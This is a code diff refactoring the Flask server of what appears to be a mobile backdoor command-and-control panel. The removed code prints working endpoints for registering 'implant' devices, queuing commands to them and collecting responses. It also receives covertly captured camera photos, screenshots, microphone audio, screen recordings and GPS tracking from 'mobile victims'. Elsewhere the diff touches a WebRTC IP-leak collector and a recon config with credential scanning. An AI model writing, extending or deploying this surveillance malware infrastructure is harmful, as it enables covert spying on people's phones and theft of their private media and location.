@@ -33,6 +33,9 @@ from app.state import (
     LOGIN_FAILS as _LOGIN_FAILS,
     ANALYTICS,
     C2_SESSIONS, C2_COMMANDS, C2_RESPONSES, C2_FILE_LISTS, C2_DOWNLOADS,
+    MOBILE_SESSIONS, MOBILE_COMMANDS, MOBILE_RESPONSES,
+    MOBILE_CAMERA_IMAGES, MOBILE_CAPTURE_DIRS, MOBILE_TRACKING_DATA,
+    WEBRTC_LEAKS, RECON_CONFIG,
     load_php_config,
     load_check_c,
     save_check_c,
@@ -617,128 +620,26 @@ def terminal_exec():
 # ===== MOBILE BACKDOOR ENDPOINTS =====
 
 # Global Mobile State
-MOBILE_SESSIONS = {}
-MOBILE_COMMANDS = {}
-MOBILE_RESPONSES = {}
-MOBILE_CAMERA_IMAGES = {}
+# P3: MOBILE_SESSIONS -> moved to app.state
 
-@app.route('/api/mobile/register', methods=['POST'])
-def mobile_register():
-    """Register a new mobile client"""
-    data = request.json
-    uid = data.get('uid')
-    info = data.get('info', {})
+# P3: MOBILE_COMMANDS -> moved to app.state
 
-    if not uid:
-        return jsonify({'error': 'No uid provided'}), 400
+# P3: MOBILE_RESPONSES -> moved to app.state
 
-    # Save to DATABASE (PERSISTENT - survives restart!)
-    db.save_mobile_session(uid, info, request.remote_addr)
-    
-    # Also keep in memory for current session
-    MOBILE_SESSIONS[uid] = {
-        'last_seen': datetime.now().isoformat(),
-        'info': info,
-        'ip': request.remote_addr,
-        'registered_at': datetime.now().isoformat()
-    }
-    
-    # Initialize queues if new
-    if uid not in MOBILE_COMMANDS:
-        MOBILE_COMMANDS[uid] = []
-    if uid not in MOBILE_RESPONSES:
-        MOBILE_RESPONSES[uid] = []
-    
-    # Send notification
-    send_notification({
-        "type": "Mobile Device Connected",
-        "uid": uid,
-        "platform": info.get('platform', 'Unknown'),
-        "userAgent": info.get('userAgent', 'Unknown'),
-        "timestamp": datetime.now().isoformat()
-    })
-    
-    return jsonify({'status': 'registered'})
+# P3: MOBILE_CAMERA_IMAGES -> moved to app.state
 
-@app.route('/api/mobile/poll', methods=['POST'])
-def mobile_poll():
-    """Mobile client polls for commands"""
-    data = request.json
-    uid = data.get('uid')
-    
-    # Update last seen in DATABASE
-    db.update_mobile_last_seen(uid)
-    
-    if uid in MOBILE_SESSIONS:
-        MOBILE_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
-    
-    # Check for commands
-    if uid in MOBILE_COMMANDS and len(MOBILE_COMMANDS[uid]) > 0:
-        cmd = MOBILE_COMMANDS[uid].pop(0)
-        return jsonify({'command': cmd})
-    
-    return jsonify({'command': None})
 
-@app.route('/api/mobile/response', methods=['POST'])
-def mobile_response():
-    """Mobile client sends command response"""
-    data = request.json
-    uid = data.get('uid')
-    output = data.get('output')
-    
-    if uid:
-        if uid not in MOBILE_RESPONSES:
-            MOBILE_RESPONSES[uid] = []
-        MOBILE_RESPONSES[uid].append({
-            'output': output,
-            'timestamp': datetime.now().isoformat()
-        })
-    
-    return jsonify({'status': 'received'})
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/register' (mobile_register)
 
-@app.route('/api/mobile/camera', methods=['POST'])
-def mobile_camera():
-    """Mobile client sends camera capture"""
-    data = request.json
-    uid = data.get('uid')
-    image_data = data.get('image')
-    
-    if uid and image_data:
-        try:
-            # Clean up headers if present
-            if ',' in image_data:
-                image_data = image_data.split(',')[1]
-            
-            decoded_data = base64.b64decode(image_data)
-            fname = 'mobile_' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.jpg'
-            images_dir = os.path.join(BASE_DIR, 'images')
-            os.makedirs(images_dir, exist_ok=True)
-            imgpath = os.path.join(images_dir, fname)
-            
-            with open(imgpath, 'wb') as f:
-                f.write(decoded_data)
-            
-            # Store reference
-            MOBILE_CAMERA_IMAGES[uid] = fname
 
-            # Index in the capture gallery (persistent across restarts)
-            db.save_mobile_capture(uid, 'camera', fname, '/images/' + fname, {
-                'size': len(decoded_data)
-            })
-            
-            # Send notification
-            send_notification({
-                "type": "Mobile Camera Capture",
-                "uid": uid,
-                "filename": fname,
-                "timestamp": datetime.now().isoformat()
-            })
-            
-            return jsonify({'status': 'saved', 'filename': fname})
-        except Exception as e:
-            return jsonify({'error': str(e)}), 500
-    
-    return jsonify({'error': 'Invalid data'}), 400
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/poll' (mobile_poll)
+
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/response' (mobile_response)
+
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/camera' (mobile_camera)
+
 
 
 # ===== MOBILE MEDIA CAPTURES =====
@@ -747,101 +648,35 @@ def mobile_camera():
 # the auth-gate allowlist. Every file is written to disk (so it survives a
 # server restart) and indexed in the database for the operator gallery.
 
-MOBILE_CAPTURE_DIRS = {
-    'screenshot': ('images', 'jpg'),
-    'camera': ('images', 'jpg'),
-    'audio': ('sounds', 'webm'),
-    'screen_record': ('videos', 'webm'),
-}
+# P3: MOBILE_CAPTURE_DIRS (block) -> app.state
+
 
 
 def _decode_data_url(payload):
-    """Decode a base64 data URL (or raw base64 payload) into raw bytes."""
-    if not payload:
-        return None
-    if isinstance(payload, bytes):
-        payload = payload.decode('utf-8', 'ignore')
-    if ',' in payload:
-        payload = payload.split(',', 1)[1]
-    payload = payload.strip()
-    try:
-        return base64.b64decode(payload, validate=False)
-    except Exception:
-        return None
+    from app.state import _decode_data_url as _real
+    return _real(payload)
 
 
 def _save_mobile_capture(uid, capture_type, field, extra_meta=None):
-    """Persist a media capture sent by the mobile implant."""
-    data = request.get_json(silent=True) or {}
-    raw = _decode_data_url(data.get(field))
-    if not raw:
-        return jsonify({'error': 'No %s data provided' % field}), 400
-
-    subdir, ext = MOBILE_CAPTURE_DIRS[capture_type]
-    target_dir = os.path.join(BASE_DIR, subdir)
-    os.makedirs(target_dir, exist_ok=True)
-
-    fname = 'mobile_%s_%s.%s' % (
-        capture_type, datetime.utcnow().strftime('%d%Y%H%M%S%f'), ext)
-    with open(os.path.join(target_dir, fname), 'wb') as f:
-        f.write(raw)
-
-    url = '/%s/%s' % (subdir, fname)
-    meta = {'size': len(raw), 'captured_at': data.get('timestamp')}
-    if data.get('url'):
-        meta['page_url'] = data.get('url')
-    if extra_meta:
-        meta.update(extra_meta)
-
-    db.save_mobile_capture(uid, capture_type, fname, url, meta)
-
-    send_notification({
-        "type": "Mobile Capture: %s" % capture_type,
-        "uid": uid,
-        "filename": fname,
-        "url": url,
-        "timestamp": datetime.now().isoformat()
-    })
-
-    return jsonify({'status': 'saved', 'filename': fname, 'url': url, 'size': len(raw)})
+    from app.state import _save_mobile_capture as _real
+    return _real(uid, capture_type, field, extra_meta)
 
 
-@app.route('/api/mobile/screenshot', methods=['POST'])
-def mobile_screenshot():
-    """Mobile client sends a screenshot capture"""
-    data = request.get_json(silent=True) or {}
-    uid = data.get('uid')
-    if not uid:
-        return jsonify({'error': 'Invalid data'}), 400
-    return _save_mobile_capture(uid, 'screenshot', 'image')
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/screenshot' (mobile_screenshot)
 
 
-@app.route('/api/mobile/audio', methods=['POST'])
-def mobile_audio():
-    """Mobile client sends a microphone recording"""
-    data = request.get_json(silent=True) or {}
-    uid = data.get('uid')
-    if not uid:
-        return jsonify({'error': 'Invalid data'}), 400
-    return _save_mobile_capture(uid, 'audio', 'audio')
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/audio' (mobile_audio)
 
 
-@app.route('/api/mobile/screen_record', methods=['POST'])
-def mobile_screen_record():
-    """Mobile client sends a screen recording"""
-    data = request.get_json(silent=True) or {}
-    uid = data.get('uid')
-    if not uid:
-        return jsonify({'error': 'Invalid data'}), 400
-    return _save_mobile_capture(uid, 'screen_record', 'video')
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/screen_record' (mobile_screen_record)
 
 
-@app.route('/api/mobile/captures', methods=['GET'])
-def mobile_captures():
-    """List media captured from mobile victims (newest first)"""
-    uid = request.args.get('uid')
-    captures = db.get_mobile_captures(uid=uid)
-    return jsonify({'captures': captures, 'count': len(captures)})
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/captures' (mobile_captures)
+
 
 
 @app.route('/videos/<filename>')
@@ -852,113 +687,21 @@ def serve_video(filename):
     return send_from_directory(videos_dir, filename)
 
 
-@app.route('/api/mobile/clients', methods=['GET'])
-def mobile_clients():
-    """Get list of connected mobile clients - LOADS FROM DATABASE!"""
-    clients = []
-    now = datetime.now()
-    
-    # Load ALL sessions from database (PERSISTENT)
-    all_sessions = db.get_all_mobile_sessions()
-    
-    # Merge with in-memory sessions
-    for uid, db_session in all_sessions.items():
-        # Update in-memory cache
-        if uid not in MOBILE_SESSIONS:
-            MOBILE_SESSIONS[uid] = db_session
-    
-    # Now check which are active
-    for uid, session in MOBILE_SESSIONS.items():
-        if not uid:
-            # Skip corrupt sessions that have no uid
-            continue
-        try:
-            last_seen = datetime.fromisoformat(session['last_seen'])
-            seconds_ago = (now - last_seen).total_seconds()
-            
-            # Show all sessions from last 24 hours (not just 60 seconds)
-            if seconds_ago < 86400:  # 24 hours
-                clients.append({
-                    'uid': uid,
-                    'info': session['info'],
-                    'ip': session['ip'],
-                    'last_seen': session['last_seen'],
-                    'seconds_ago': int(seconds_ago),
-                    'status': 'online' if seconds_ago < 60 else 'offline'
-                })
-        except:
-            pass
-    
-    return jsonify({'clients': clients})
-
-@app.route('/api/mobile/send_command', methods=['POST'])
-def mobile_send_command():
-    """Send command to mobile client"""
-    data = request.json
-    uid = data.get('uid')
-    command = data.get('command')
-    
-    if uid and command:
-        if uid not in MOBILE_COMMANDS:
-            MOBILE_COMMANDS[uid] = []
-        MOBILE_COMMANDS[uid].append(command)
-        return jsonify({'status': 'queued'})
-    
-    return jsonify({'error': 'Invalid data'}), 400
-
-@app.route('/api/mobile/get_response/<uid>', methods=['GET'])
-def mobile_get_response(uid):
-    """Get latest response from mobile client"""
-    if uid in MOBILE_RESPONSES and len(MOBILE_RESPONSES[uid]) > 0:
-        response = MOBILE_RESPONSES[uid].pop(0)
-        return jsonify(response)
-    
-    return jsonify({'output': None})
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/clients' (mobile_clients)
 
 
-# Global tracking data storage
-MOBILE_TRACKING_DATA = {}
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/send_command' (mobile_send_command)
 
-@app.route('/api/mobile/background_data', methods=['POST'])
-def mobile_background_data():
-    """Receive background tracking data from mobile client"""
-    data = request.json
-    uid = data.get('uid')
-    tracking_data = data.get('data')
-    
-    if uid and tracking_data:
-        if uid not in MOBILE_TRACKING_DATA:
-            MOBILE_TRACKING_DATA[uid] = []
-        
-        # Store tracking data with timestamp
-        tracking_data['received_at'] = datetime.now().isoformat()
-        MOBILE_TRACKING_DATA[uid].append(tracking_data)
-        
-        # Keep only last 100 entries per device
-        if len(MOBILE_TRACKING_DATA[uid]) > 100:
-            MOBILE_TRACKING_DATA[uid] = MOBILE_TRACKING_DATA[uid][-100:]
-        
-        # Send notification for important events
-        if tracking_data.get('type') == 'background_location':
-            send_notification({
-                "type": "Mobile Location Update",
-                "uid": uid,
-                "latitude": tracking_data.get('latitude'),
-                "longitude": tracking_data.get('longitude'),
-                "timestamp": tracking_data.get('timestamp')
-            })
-        
-        return jsonify({'status': 'received'})
-    
-    return jsonify({'error': 'Invalid data'}), 400
 
-@app.route('/api/mobile/tracking_data/<uid>', methods=['GET'])
-def mobile_get_tracking_data(uid):
-    """Get tracking data for a specific mobile client"""
-    if uid in MOBILE_TRACKING_DATA:
-        return jsonify({'data': MOBILE_TRACKING_DATA[uid]})
-    
-    return jsonify({'data': []})
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/get_response/<uid>' (mobile_get_response)
+
+
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/background_data' (mobile_background_data)
+
+
+# moved to app/blueprints/capture_mobile.py -> '/api/mobile/tracking_data/<uid>' (mobile_get_tracking_data)
+
 
 
 # ===== ADVANCED ANALYTICS API =====
@@ -1646,7 +1389,8 @@ def telegram_stop():
 
 # ===== WEBRTC IP LEAK ENDPOINT =====
 
-WEBRTC_LEAKS = []
+# P3: WEBRTC_LEAKS -> moved to app.state
+
 
 @app.route('/api/webrtc_leak', methods=['POST'])
 def webrtc_leak():
@@ -1687,13 +1431,8 @@ def webrtc_leaks_list():
 
 # ===== AUTO-RECON API =====
 
-RECON_CONFIG = {
-    'auto_fingerprint': True,
-    'auto_webrtc': True,
-    'auto_geofence_check': True,
-    'auto_credential_scan': False,
-    'auto_profile_build': True,
-}
+# P3: RECON_CONFIG (block) -> app.state
+
 
 @app.route('/api/recon/config', methods=['GET', 'POST'])
 def recon_config():
